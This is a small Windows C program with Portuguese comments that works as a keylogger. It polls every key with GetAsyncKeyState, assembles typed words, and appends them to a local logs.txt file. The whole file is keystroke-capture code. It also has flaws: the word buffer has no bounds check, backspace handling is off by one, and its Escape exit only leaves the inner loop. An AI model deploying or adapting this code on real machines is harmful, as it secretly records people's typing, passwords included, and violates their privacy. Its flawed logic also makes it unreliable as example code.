#include <stdio.h>
#include <windows.h>

int main()
{
    FILE *fptr;

    char palavra[100];
    int count = 0;
    
    printf("teste");
    while (1)
    {
        for (int vk = 0x08; vk <= 0xFE; vk++)
        {
            if (GetAsyncKeyState(vk) & 0x8000)
            {
                // Mapeia o código virtual para scan code
                UINT scanCode = MapVirtualKey(vk, MAPVK_VK_TO_VSC);

                // Monta o valor lParam como se viesse de uma mensagem WM_KEYDOWN
                LONG lParam = (scanCode << 16);

                // Buffer para o nome da tecla
                char keyName[128];
                if (GetKeyNameText(lParam, keyName, sizeof(keyName)) > 0)
                {

                    if (scanCode == 14)
                    {
                        if (count <= 0) continue;

                        palavra[count--] = '\0';
                        continue;
                    }
                    
                    if (scanCode == 57 || scanCode == 28)
                    {
                        if (count > 0)
                        {
                            system("cls");

                            // Finalizando o arquivo log txt
                            palavra[count] = '\0';

                            // Salavando arquivo
                            fptr = fopen("logs.txt", "a");
                            fprintf(fptr, "%s\n", palavra);
                            fclose(fptr);

                            palavra[0] = '\0';
                            count = 0;
                        }
                        continue;
                    }

                    //  Salvando as teclas e montando a palavra
                    palavra[count++] = keyName[0];
                    printf("%c", keyName[0]);
                    //printf("Tecla: %s\n", keyName[0]);

                    if (scanCode == 1) break;
                }
                else
                {
                    printf("Tecla: VK %d\n", vk);
                }

                // Evita repetir rápido demais
                Sleep(100);
            }
        }
    }
    return 0;
}